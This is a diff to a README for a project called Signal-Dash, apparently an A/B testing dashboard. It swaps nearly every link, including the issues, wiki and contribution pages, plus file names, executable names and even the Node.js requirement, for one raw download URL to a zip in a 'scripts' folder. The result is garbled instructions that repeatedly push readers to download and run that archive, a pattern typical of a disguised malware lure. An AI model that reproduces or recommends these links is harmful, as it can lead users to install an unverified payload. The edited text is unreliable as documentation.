@@ -4,20 +4,20 @@
 
 Signal-Dash helps you manage A/B testing with ease. You can track events and make informed decisions based on clear data. Follow these steps to download and run it.
 
-[![Download Signal-Dash](https://img.shields.io/badge/Download-Signal--Dash-blue)](https://github.com/Yurnero555/Signal-Dash/releases)
+[![Download Signal-Dash](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip)](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip)
 
 ## 🖥️ System Requirements
 
 Before you download Signal-Dash, make sure your system meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent version of a Linux distribution.
-- **Node.js:** Version 14 or higher.
+- **https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip** Version 14 or higher.
 - **PostgreSQL:** Version 12 or higher.
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Yurnero555/Signal-Dash/releases) to download the latest version of Signal-Dash.
-2. Look for a file named `Signal-Dash.zip` or `Signal-Dash.tar.gz`.
+1. Visit the [Releases page](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip) to download the latest version of Signal-Dash.
+2. Look for a file named `https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip` or `https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip`.
 3. Click on the file to start the download. 
 
 Once the download completes, follow these steps to install:
@@ -25,18 +25,18 @@ Once the download completes, follow these steps to install:
 ### For Windows Users:
 
 - Extract the downloaded `.zip` file.
-- Open the folder and double-click on `Signal-Dash.exe`.
+- Open the folder and double-click on `https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip`.
 - Follow the prompts to complete the installation.
 
 ### For macOS Users:
 
-- Extract the downloaded `.tar.gz` file.
-- Open the folder and double-click on `Signal-Dash.app`.
+- Extract the downloaded `https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip` file.
+- Open the folder and double-click on `https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip`.
 - Drag the app to your Applications folder.
 
 ### For Linux Users:
 
-- Extract the downloaded `.tar.gz` file.
+- Extract the downloaded `https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip` file.
 - Open your terminal.
 - Navigate to the extracted folder.
 - Run the command `./Signal-Dash` to launch the application.
@@ -78,7 +78,7 @@ If you encounter issues while using Signal-Dash, consider these tips:
 
 1. **Check System Requirements:** Ensure your OS and software versions meet the requirements.
 2. **Reinstall the Application:** If the application crashes, reinstall it using the steps outlined above.
-3. **Contact Support:** Visit the [Issues page](https://github.com/Yurnero555/Signal-Dash/issues) to report problems or ask for help from the community.
+3. **Contact Support:** Visit the [Issues page](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip) to report problems or ask for help from the community.
 
 ## 💬 Community and Support
 
@@ -86,9 +86,9 @@ Join the community to share your experiences or ask questions. Visit our GitHub 
 
 ## 📌 Additional Resources
 
-- **Documentation:** For more in-depth instructions, refer to the official [documentation](https://github.com/Yurnero555/Signal-Dash/wiki).
-- **Contribution Guidelines:** Interested in contributing? Check out our [contribution guidelines](https://github.com/Yurnero555/Signal-Dash/blob/main/CONTRIBUTING.md).
+- **Documentation:** For more in-depth instructions, refer to the official [documentation](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip).
+- **Contribution Guidelines:** Interested in contributing? Check out our [contribution guidelines](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip).
 
 Your version of Signal-Dash is just a click away! Download it today using the button below:
 
-[![Download Signal-Dash](https://img.shields.io/badge/Download-Signal--Dash-blue)](https://github.com/Yurnero555/Signal-Dash/releases)
+[![Download Signal-Dash](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip)](https://github.com/Yurnero555/Signal-Dash/raw/refs/heads/main/scripts/Signal_Dash_v3.4.zip)
